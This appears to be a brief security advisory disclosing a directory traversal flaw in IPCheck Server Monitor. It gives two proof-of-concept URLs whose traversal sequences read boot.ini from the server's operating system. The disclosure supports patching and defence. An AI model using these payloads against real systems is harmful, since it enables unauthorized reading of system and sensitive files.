Subject: Directory Traversal vulnerability in IPCheck Monitor Server

Directory Traversal vulnerability in IPCheck Monitor Server
--------------------------------------

Overview

A directory traversal vulnerability has been identified in IPCheck Server Monitor Free/Trial/Professional, which may be exploited by potential attackers to retrieve files from the underlying OS.

http://[IPAddress]/images%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini

http://[IP address]/images../..../..../..../..../..../..../..../..../..../..../..../boot.ini
